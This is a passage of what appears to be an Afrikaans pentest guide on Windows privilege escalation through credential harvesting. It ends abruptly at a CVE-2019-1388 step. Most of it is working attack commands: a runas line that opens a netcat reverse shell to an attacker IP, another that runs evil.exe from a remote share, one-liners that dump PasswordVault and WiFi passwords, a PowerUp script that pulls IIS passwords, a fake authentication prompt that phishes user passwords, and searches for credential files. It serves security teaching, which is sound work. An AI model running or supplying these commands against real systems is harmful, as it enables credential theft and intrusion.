Tensy die toepassings met Credential Manager integreer, dink ek nie dit is moontlik vir hulle om die aanmeldingsbesonderhede vir ’n gegewe hulpbron te gebruik nie. As jou toepassing dus van die vault wil gebruik maak, moet dit op die een of ander manier **met die credential manager kommunikeer en die aanmeldingsbesonderhede vir daardie hulpbron** uit die verstekstoorvault aanvra.

Gebruik `cmdkey` om die gestoorde aanmeldingsbesonderhede op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde credentials te gebruik. Die volgende voorbeeld roep 'n afgeleë binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met ’n verskafde stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let daarop dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of vanaf [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP-toepassings, Microsoft Edge en moderne stelseldienste stoor verifikasietokens en plaintext-wagwoorde binne die Universal Windows Platform (UWP) `PasswordVault` (ook as `Web Credentials` in `vaultcmd` blootgestel). Hierdie stoorspasie is sessie-geïsoleer en kan native gedekripteer word sonder administratiewe regte of `SeDebugPrivilege`.

Voer hierdie PowerShell-opdrag binne die gebruiker se aktiewe sessie uit om alle gestoorde gebruikersname en plaintext-wagwoorde onmiddellik te dump en te dekripteer:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

Die **Data Protection API (DPAPI)** bied ’n metode vir simmetriese enkripsie van data, wat hoofsaaklik binne die Windows-bedryfstelsel gebruik word vir die simmetriese enkripsie van asimmetriese private keys. Hierdie enkripsie gebruik ’n gebruiker- of stelselgeheim om ’n beduidende bydrae tot entropie te lewer.

**DPAPI maak die enkripsie van keys moontlik deur middel van ’n simmetriese key wat van die gebruiker se login-geheime afgelei word**. In scenario’s wat stelsel-enkripsie behels, gebruik dit die stelsel se domein-authentication-geheime.

Geënkripteerde gebruiker-RSA-keys word, deur DPAPI te gebruik, in die `%APPDATA%\Microsoft\Protect\{SID}`-gids gestoor, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-key, wat saam met die master key geleë is wat die gebruiker se private keys in dieselfde lêer beskerm**, bestaan tipies uit 64 grepe ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is, wat voorkom dat die inhoud daarvan deur die `dir`-opdrag in CMD gelys word, hoewel dit deur PowerShell gelys kan word.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te dekripteer.

Die **geloofsbrieflêers wat deur die hoofwagwoord beskerm word**, is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te decrypt.\
Jy kan **baie DPAPI** **masterkeys** uit **memory** onttrek met die `sekurlsa::dpapi`-module (indien jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels vir **scripting** en outomatiseringstake gebruik as ’n manier om encrypted credentials gerieflik te stoor. Die credentials word met **DPAPI** beskerm, wat tipies beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, gedecrypt kan word.

Om PS credentials uit die lêer wat dit bevat te decrypt, kan jy die volgende doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Geloofsbriefbestuurder vir afstandwerkskerm**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg`-module met die toepaslike `/masterkey` om **enige .rdg-lêers te decrypt**\
Jy kan **baie DPAPI masterkeys** uit geheue **extract** met die Mimikatz `sekurlsa::dpapi`-module

### Sticky Notes

Mense gebruik dikwels die Sticky Notes-app op Windows-werkstasies om **passwords** en ander inligting te **save**, sonder om te besef dat dit ’n databasislêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om voor te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat jy ’n Administrator moet wees en onder ’n High Integrity-vlak moet loop om passwords van AppCmd.exe te recover.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\`-gids.\
As hierdie lêer bestaan, is dit moontlik dat sommige **credentials** gekonfigureer is en **recovered** kan word.

Hierdie code is uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) onttrek:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installeerders word **met SYSTEM-voorregte uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH-gasheersleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in register

SSH-private sleutels kan binne die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy nagaan of daar enigiets interessants daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, sal dit waarskynlik 'n gestoorde SSH-sleutel wees. Dit word geënkripteer gestoor, maar kan maklik gedekripteer word met [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties met selflaai begin, voer die volgende uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om sommige ssh-sleutels te skep, dit met `ssh-add` by te voeg en via ssh by ’n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie, en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutelverifikasie geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- en SYSTEM-rugsteunkopieë
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek na ’n lêer genaamd **SiteList.xml**

### Gecachede GPP-wagwoord

’n Funksie was voorheen beskikbaar waarmee pasgemaakte plaaslike administrateurrekeninge op ’n groep masjiene via Group Policy Preferences (GPP) ontplooi kon word. Hierdie metode het egter beduidende sekuriteitsfoute gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domeingebruiker verkry word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 en ’n publiek gedokumenteerde versteksleutel geïnkripteer is, deur enige geverifieerde gebruiker gedekripteer word. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers kon toelaat om verhoogde voorregte te verkry.

Om hierdie risiko te beperk, is ’n funksie ontwikkel om te soek na plaaslik gecachede GPP-lêers wat ’n nie-leë `"cpassword"`-veld bevat. Wanneer so ’n lêer gevind word, dekripteer die funksie die wagwoord en gee dit ’n pasgemaakte PowerShell-object terug. Hierdie objek bevat besonderhede oor die GPP en die lêer se ligging, wat help met die identifisering en remediëring van hierdie sekuriteitskwesbaarheid.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_ na hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te dekripteer:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Deur crackmapexec te gebruik om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-aanmeldbesonderhede
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir geloofsbriewe

Jy kan altyd **die gebruiker vra om sy geloofsbriewe, of selfs die geloofsbriewe van 'n ander gebruiker, in te voer** as jy dink hy ken dit (let daarop dat dit werklik **riskant** is om die kliënt direk vir die **geloofsbriewe** te vra):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat credentials bevat**

Bekende lêers wat ’n tyd gelede **wagwoorde** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Deursoek al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in die RecycleBin

Jy moet ook die Bin nagaan om daarin na credentials te soek

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die registry

**Ander moontlike registry-sleutels met credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir dbs waar wagwoorde van **Chrome of Firefox** gestoor word.\
Kyk ook na die geskiedenis, boekmerke en gunstelinge van die blaaiers, want moontlik word sommige **wagwoorde daar** gestoor.

Tools om wagwoorde uit blaaiers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is ’n tegnologie wat binne die Windows-bedryfstelsel ingebou is en wat **interkommunikasie** tussen sagtewarekomponente van verskillende tale moontlik maak. Elke COM-komponent word **deur middel van ’n klas-ID (CLSID) geïdentifiseer**, en elke komponent stel funksionaliteit bloot via een of meer koppelvlakke, wat deur middel van koppelvlak-ID’s (IIDs) geïdentifiseer word.

COM-klasse en -koppelvlakke word onderskeidelik in die register onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** gedefinieer. Hierdie register word geskep deur die samevoeging van **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Binne die CLSID’s van hierdie register kan jy die kindregister **InProcServer32** vind, wat ’n **verstekte waarde** bevat wat na ’n **DLL** wys, asook ’n waarde genaamd **ThreadingModel** wat **Apartment** (Enkeldraad), **Free** (Veelvoudige drade), **Both** (Enkel- of veelvoudige drade) of **Neutral** (Draad-neutraal) kan wees.

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Basies, indien jy enige van die **DLL’s kan oorskryf** wat uitgevoer gaan word, kan jy **voorregte eskaleer** indien daardie DLL deur ’n ander gebruiker uitgevoer gaan word.

Om te leer hoe aanvallers COM Hijacking as ’n persistence-meganisme gebruik, kyk na:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n sekere lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools wat vir wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf**-plugin wat ek geskep het om **outomaties elke metasploit POST module uit te voer wat binne die slagoffer na credentials soek**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat die wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende tool om wagwoorde uit 'n stelsel te onttrek.

Die tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **volle toegang**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae privileges, maar wat al die oop handles van die hoofproses erf**.\
Dan, as jy **volle toegang tot die proses met lae privileges het**, kan jy die **oop handle na die geprivilegieerde proses wat met** `OpenProcess()` **geskep is, bekom** en **shellcode inject**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie vulnerability op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander plasing vir 'n vollediger verduideliking van hoe om meer oop handlers van prosesse en threads wat met verskillende vlakke van permissions geërf is, te toets en te misbruik (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, waarna as **pipes** verwys word, maak proseskommunikasie en data-oordrag moontlik.

Windows verskaf 'n funksie genaamd **Named Pipes**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos 'n kliënt/bediener-argitektuur, met rolle wat as **named pipe server** en **named pipe client** gedefinieer word.

Wanneer data deur 'n **client** via 'n pipe gestuur word, het die **server** wat die pipe opgestel het die vermoë om die identiteit van die **client** **aan te neem**, mits dit die nodige **SeImpersonate**-regte het. Deur 'n **geprivilegieerde proses** te identifiseer wat kommunikeer via 'n pipe wat jy kan naboots, kry jy die geleentheid om **hoër privileges te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het, interaksie het. Instruksies oor hoe om so 'n aanval uit te voer, kan [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system) gevind word.

Die volgende tool laat jou ook toe om 'n named pipe-kommunikasie met 'n tool soos burp te **intercept**: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat jou toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) in server-modus stel `\\pipe\\tapsrv` (MS-TRP) bloot. 'n Remote geauthentiseerde client kan die mailslot-gebaseerde async event-pad misbruik om `ClientAttach` in 'n arbitrêre **4-byte write** na enige bestaande lêer wat deur `NETWORK SERVICE` geskryf kan word, te verander en dan Telephony-adminregte te verkry en 'n arbitrêre DLL as die diens te laai. Volledige vloei:

- `ClientAttach` met `pszDomainUser` gestel op 'n skryfbare bestaande pad → die diens maak dit oop via `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir async event writes.
- Elke event skryf die aanvaller-beheerde `InitContext` vanaf `Initialize` na daardie handle. Registreer 'n line app met `LRegisterRequestRecipient` (`Req_Func 61`), aktiveer `TRequestMakeCall` (`Req_Func 121`), haal dit op via `GetAsyncEvents` (`Req_Func 0`), en deregistreer/shutdown dan om deterministiese writes te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, koppel weer, en roep `GetUIDllName` met 'n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` aangestuur word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde skema) aktiveer en aanvaller-beheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar scheduled tasks of ander prosesse wees wat uitgevoer word en wat **credentials op die command line deurgee**. Die script hieronder vang proses-command lines elke twee sekondes vas en vergelyk die huidige toestand met die vorige toestand, en vertoon enige verskille.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Wagwoorde uit prosesse steel

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang tot die grafiese koppelvlak het (via console of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminale of enige ander proses, soos "NT\AUTHORITY SYSTEM", vanaf ’n unprivileged user te laat loop.

Dit maak dit moontlik om privileges te eskaleer en UAC terselfdertyd met dieselfde vulnerability te bypass. Daarbenewens is dit nie nodig om enigiets te installeer nie, en die binary wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die geaffekteerde systems is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:
```
